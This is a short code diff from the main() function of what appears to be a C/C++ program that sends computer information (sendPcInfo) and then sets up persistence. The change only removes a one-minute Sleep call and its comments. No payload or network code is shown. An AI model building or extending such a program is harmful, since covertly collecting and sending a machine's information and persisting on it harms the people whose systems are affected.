@@ -77,9 +77,6 @@ int main(int argc, char* argv[]) {
 	// Computer informations
 
 	sendPcInfo();
-	Sleep(60000); // Try to fix issues.
-	
-	// Wait 1 minute.
 
 	// Persistence
 
